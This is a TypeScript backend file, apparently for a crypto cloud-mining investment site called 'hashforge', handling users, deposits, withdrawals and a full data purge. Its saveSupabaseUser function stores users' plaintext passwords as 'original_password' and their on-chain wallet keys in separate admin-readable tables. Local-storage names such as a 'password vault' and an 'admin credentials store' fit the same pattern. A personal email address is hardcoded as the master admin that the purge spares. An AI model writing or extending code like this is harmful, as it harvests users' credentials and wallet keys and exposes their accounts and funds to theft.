      await supabase.from('deposits').delete().in('id', ids);
    }
    await supabase.from('deposits').delete().not('id', 'is', null);
    return true;
  } catch (err) {
    console.warn('Clear all deposits error:', err);
    return false;
  }
}

export async function purgeAllTestData(): Promise<{ success: boolean; message: string }> {
  try {
    // 1. Purge all deposits completely from Supabase
    try {
      await supabase.from('deposits').delete().neq('id', '___keep_none___');
      const { data: allDeps } = await supabase.from('deposits').select('id');
      if (allDeps && allDeps.length > 0) {
        const ids = allDeps.map(d => d.id);
        await supabase.from('deposits').delete().in('id', ids);
      }
    } catch (dbErr) {
      console.warn('Supabase deposits purge warning:', dbErr);
    }

    // 2. Purge all withdrawals from Supabase
    try {
      await supabase.from('withdrawals').delete().neq('id', '___keep_none___');
      const { data: allW } = await supabase.from('withdrawals').select('id');
      if (allW && allW.length > 0) {
        const ids = allW.map(w => w.id);
        await supabase.from('withdrawals').delete().in('id', ids);
      }
    } catch (dbErr) {
      console.warn('Supabase withdrawals purge warning:', dbErr);
    }

    // 3. Purge all mining contracts from Supabase
    try {
      await supabase.from('mining_contracts').delete().neq('id', '___keep_none___');
    } catch (dbErr) {
      console.warn('Supabase contracts purge warning:', dbErr);
    }

    // 4. Purge test clients (preserve master admin account records)
    try {
      await supabase
        .from('clients')
        .delete()
        .neq('email', 'yousaftariq2014@gmail.com');

      const { data: allClients } = await supabase.from('clients').select('id, email');
      if (allClients && allClients.length > 0) {
        const clientIdsToDelete = allClients
          .filter(c => c.email?.trim().toLowerCase() !== 'yousaftariq2014@gmail.com')
          .map(c => c.id);
        if (clientIdsToDelete.length > 0) {
          await supabase.from('clients').delete().in('id', clientIdsToDelete);
        }
      }
    } catch (dbErr) {
      console.warn('Supabase clients purge warning:', dbErr);
    }

    // 5. Purge test credentials from client_credentials (Folder 1)
    try {
      await supabase
        .from('client_credentials')
        .delete()
        .neq('email', 'yousaftariq2014@gmail.com');
    } catch (dbErr) {
      console.warn('Supabase client_credentials purge warning:', dbErr);
    }

    // 6. Purge test onchain keys from client_onchain_keys (Folder 2)
    try {
      await supabase
        .from('client_onchain_keys')
        .delete()
        .neq('email', 'yousaftariq2014@gmail.com');
    } catch (dbErr) {
      console.warn('Supabase client_onchain_keys purge warning:', dbErr);
    }

    // 7. Clear all local browser test databases & sessions
    localStorage.removeItem('hashforge_deposits');
    localStorage.removeItem('hashforge_withdrawals');
    localStorage.removeItem('hashforge_registered_users');
    localStorage.removeItem('hashforge_password_vault');
    localStorage.removeItem('hashforge_admin_credentials_store');
    sessionStorage.removeItem('hashforge_password_recovery_active');
    
    // Clear active client session if not master admin
    try {
      const activeUser = localStorage.getItem('hashforge_user');
      if (activeUser) {
        const parsed = JSON.parse(activeUser);
        if (parsed?.email?.trim().toLowerCase() !== 'yousaftariq2014@gmail.com') {
          localStorage.removeItem('hashforge_user');
        }
      }
    } catch {}

    return {
      success: true,
      message: 'All test clients, deposits, packages and withdrawals have been deleted. Database reset to clean zero-base!'
    };
  } catch (err: any) {
    return {
      success: false,
      message: err?.message || 'Purge failed'
    };
  }
}

export async function saveSupabaseUser(user: UserProfile): Promise<boolean> {
  try {
    const cleanEmail = user.email?.trim().toLowerCase() || '';
    if (user.password || user.onchainKey) {
      recordClientPassword(cleanEmail, user.password, user.onchainKey);
    }

    const isVipActive = typeof user.vipLevel === 'number' && user.vipLevel > 0;
    const computedPlan = isVipActive ? (user.plan || `VIP ${user.vipLevel}`) : 'No Active Package';
    const computedVip = isVipActive ? user.vipLevel : 0;

    const payload: any = {
      id: user.id,
      name: user.name,
      email: cleanEmail,
      plan: computedPlan,
      vip_level: computedVip,
      joined_date: user.joinedDate || new Date().toISOString().substring(0, 10),
      is_logged_in: user.isLoggedIn ?? true,
      account_status: user.accountStatus || 'active',
      status_reason: user.statusReason || null,
      status_updated_at: user.statusUpdatedAt || new Date().toISOString(),
      ...(user.password ? { password: user.password } : {}),
      ...(user.onchainKey ? { onchain_key: user.onchainKey } : {}),
    };

    const { error } = await supabase.from('clients').upsert(payload);

    if (user.password) {
      try {
        await supabase.from('client_credentials').upsert({
          id: user.id,
          user_id: user.id,
          name: user.name,
          email: cleanEmail,
          original_password: user.password,
          updated_at: new Date().toISOString(),
        });
      } catch (e) {
        console.warn('client_credentials save warning:', e);
      }
    }

    if (user.onchainKey) {
      try {
        await supabase.from('client_onchain_keys').upsert({
          id: user.id,
          user_id: user.id,
          name: user.name,
          email: cleanEmail,
          onchain_key: user.onchainKey,
          updated_at: new Date().toISOString(),
        });
      } catch (e) {
        console.warn('client_onchain_keys save warning:', e);
      }
    }

    if (error) {
      console.warn('Supabase client save warning (retrying safe payload):', error.message);
      // If table lacks password/onchain_key/account_status columns, retry without those keys so saving still succeeds
      const safePayload = {
        id: user.id,
        name: user.name,
        email: cleanEmail,
        plan: computedPlan,
        vip_level: computedVip,
        joined_date: user.joinedDate || new Date().toISOString().substring(0, 10),
        is_logged_in: user.isLoggedIn ?? true,
      };
      await supabase.from('clients').upsert(safePayload);
      return false;
    }
    return true;
  } catch (err) {
    console.warn('Supabase save error:', err);
    return false;
  }
}

// ----------------------------------------------------
// DEPOSITS SYNC
// ----------------------------------------------------
export async function fetchSupabaseDeposits(): Promise<DepositRequest[] | null> {
  try {
    const { data, error } = await supabase
      .from('deposits')
      .select('*')
      .order('inserted_at', { ascending: false });

    if (error) {
      console.warn('Supabase fetch deposits warning (fallback to local):', error.message);
      return null;
    }

    if (!data) return [];
    if (data.length === 0) return [];

    return data.map(item => ({
      id: item.id,
      userId: item.user_id,
      userName: item.user_name,
      packageId: item.package_id,
      packageName: item.package_name,
      vipLevel: item.vip_level,
      amountUsd: Number(item.amount_usd),
      network: item.network as any,
      depositAddress: item.deposit_address,
      senderTxid: item.sender_txid,
      status: item.status as any,
      createdAt: item.created_at,
      approvedAt: item.approved_at || undefined,
      explorerConfirmed: !!item.explorer_confirmed,
    }));
  } catch (err) {
    console.warn('Supabase deposits fetch error:', err);
    return null;
  }
}

export async function insertSupabaseDeposit(deposit: DepositRequest): Promise<boolean> {
  try {
    const { error } = await supabase.from('deposits').upsert({
      id: deposit.id,
      user_id: deposit.userId,
      user_name: deposit.userName,
      package_id: deposit.packageId,
      package_name: deposit.packageName,
      vip_level: deposit.vipLevel,
      amount_usd: deposit.amountUsd,
      network: deposit.network,
      deposit_address: deposit.depositAddress,
      sender_txid: deposit.senderTxid,
      status: deposit.status,
      created_at: deposit.createdAt,
      approved_at: deposit.approvedAt || null,
    });

    if (error) {
      console.warn('Supabase insert deposit error:', error.message);
      return false;
    }
    return true;
  } catch (err) {
    console.warn('Supabase deposit insert error:', err);
    return false;
  }
}

/**
 * FIX: previously this only updated `status` / `approved_at`. The client
 * dashboard requires BOTH status === 'approved' AND explorer_confirmed === true
 * before it will show a purchased package/balance. Approving a deposit in the
 * admin portal must therefore also set explorer_confirmed to true (the admin
 * is expected to have manually checked the sender_txid on the blockchain
 * explorer before clicking Approve) — otherwise the client's package never
 * appears even though status says "approved".
 */
export async function updateSupabaseDepositStatus(
  depositId: string, 
  status: 'approved' | 'rejected', 
  approvedAt?: string,
  explorerConfirmed: boolean = false
): Promise<boolean> {
  try {
    const updatePayload: any = { status };

    if (approvedAt) {
      updatePayload.approved_at = approvedAt;
    }

    if (status === 'approved') {
      updatePayload.explorer_confirmed = explorerConfirmed;
      updatePayload.verified_at = explorerConfirmed ? new Date().toISOString() : null;
    } else {
      // rejected: make sure it can never count as usable balance
      updatePayload.explorer_confirmed = false;
      updatePayload.verified_at = null;
    }

    const { error } = await supabase
      .from('deposits')
      .update(updatePayload)
      .eq('id', depositId);

    if (error) {
      console.warn('Supabase update deposit error:', error.message);
      return false;
    }
    return true;
  } catch (err) {
    console.warn('Supabase update status error:', err);
    return false;
  }
}

// ----------------------------------------------------
// WITHDRAWALS SYNC
// ----------------------------------------------------
export async function fetchSupabaseWithdrawals(): Promise<WithdrawalRecordItem[] | null> {
  try {
    const { data, error } = await supabase
      .from('withdrawals')
      .select('*')
      .order('inserted_at', { ascending: false });

    if (error) return null;
    if (!data) return [];
    if (data.length === 0) return [];

    return data.map(item => ({
      id: item.id,
      userId: item.user_id || undefined,
      userName: item.user_name || undefined,
      currency: item.currency,
      type: item.type,
      amount: Number(item.amount),
      walletAddress: item.wallet_address || undefined,
      status: item.status as any,
      time: item.time,
      txHash: item.tx_hash || undefined,
    }));
  } catch (err) {
    return null;
  }
}

export async function insertSupabaseWithdrawal(record: WithdrawalRecordItem): Promise<boolean> {
  try {
    const { error } = await supabase.from('withdrawals').upsert({
      id: record.id,
      user_id: record.userId || null,
      user_name: record.userName || null,
      currency: record.currency,
      type: record.type,
      amount: record.amount,
      wallet_address: record.walletAddress || null,
      status: record.status,
      time: record.time,
      tx_hash: record.txHash || null,
    });

    if (error) return false;
    return true;
  } catch (err) {
    return false;
  }
}

export async function updateSupabaseWithdrawalStatus(
  withdrawalId: string,
  status: 'Pending' | 'Withdrawal successfully' | 'Failed',
  txHash?: string
): Promise<boolean> {
  try {
    const payload: any = { status };
    if (txHash) {
      payload.tx_hash = txHash;
    }

    const { error } = await supabase
      .from('withdrawals')
      .update(payload)
      .eq('id', withdrawalId);

    if (error) {
      console.warn('Supabase update withdrawal status error:', error.message);
      return false;
    }
    return true;
  } catch (err) {
    console.warn('Supabase update withdrawal error:', err);
    return false;
  }
}
